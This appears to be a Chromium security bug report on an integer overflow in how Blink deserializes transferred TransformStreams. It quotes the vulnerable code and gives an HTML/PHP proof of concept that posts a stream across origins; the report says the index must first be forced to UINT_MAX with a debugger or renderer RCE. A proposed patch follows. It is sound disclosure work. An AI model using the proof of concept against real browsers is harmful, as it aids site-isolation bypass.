<b>VULNERABILITY DETAILS</b>

---

    case kTransformStreamTransferTag: {
      if (!TransferableStreamsEnabled())
        return nullptr;
      uint32_t index = 0;
      if (!ReadUint32(&index) || !transferred_stream_ports_ ||
          index + 1 >= transferred_stream_ports_->size()) {
        return nullptr;
      }
      ReadableStream* readable = ReadableStream::Deserialize(
          script_state_, (*transferred_stream_ports_)[index].Get(),
          exception_state);
      if (!readable)
        return nullptr;

      WritableStream* writable = WritableStream::Deserialize(
          script_state_, (*transferred_stream_ports_)[index + 1].Get(),
          exception_state);
      if (!writable)
        return nullptr;

      return MakeGarbageCollected<TransformStream>(readable, writable);
    }



---
- [1] https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/bindings/core/v8/serialization/v8_script_value_deserializer.cc;l=572-593;bpv=1;bpt=1

kTransformStreamTransferTag only validate out-of-bound access, it should also check integer overflow to protect accessing the different readable stream.
It can be using with bypassing site-isolation since we can send a serialized message via postMessage.

<b>VERSION</b>

navigator.userAgent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"

<b>REPRODUCTION CASE</b>

[PoC]
<html>
    <head>
        <?php
if ($_GET['x'] == 1) { // app.imjuno.com
        ?>
        <meta http-equiv="origin-trial" content="AhPJIdzCggLn5eyC5UyXR1T+zK/cyngs5obkhmVNihHRn/nQ8dZHYv/sO792DhhqdLYZbzBao1vu9JqyIYrt7AIAAABweyJvcmlnaW4iOiJodHRwczovL3Rlc3Rkb21haW4uanVubzo0NDMiLCJmZWF0dXJlIjoiUlRDSW5zZXJ0YWJsZVN0cmVhbXMiLCJleHBpcnkiOjE1OTc5OTc1ODIsImlzU3ViZG9tYWluIjp0cnVlfQ==">
<?php
    } else { // testdomain.juno (different process)
?>
        <meta http-equiv="origin-trial" content="Auaakp264bS0a1jJ9m6KFG4DTeuwl3Bvgw8+ZiIf6LKlcs2VyBbcyPM/m4ihnwqW+Jj7lFuyI3g0bJe4mGtDcgoAAABceyJvcmlnaW4iOiJodHRwczovL2FwcC5pbWp1bm8uY29tOjQ0MyIsImZlYXR1cmUiOiJSVENJbnNlcnRhYmxlU3RyZWFtcyIsImV4cGlyeSI6MTU5Nzk5MDExNH0=">

<?php
    }
?>

    </head>
    <body>
    <script>
if (location.search.length > 1) // testdomain.juno (different process)
        window.onmessage = function() { console.log('yeah', arguments[0].data) }
else { // app.imjuno.com
    var orig = new TransformStream();
    var other = new TransformStream()
    var target = window.open('https://testdomain.juno/m/a.php?x=1');
    setTimeout(function() { console.log(1234); target.postMessage(orig, '*', [orig]); }, 1000);
}
    </script>
    </body>
</html>

index must be changed to UINT_MAX (0xffffffff) with debugger (or code execution via renderer RCE).

Below is a possible patch. (return nullptr if read index is kNotFound (-1))

      if (!ReadUint32(&index) || index == kNotFound || !transferred_stream_ports_ ||
          index + 1 >= transferred_stream_ports_->size()) {
        return nullptr;
      }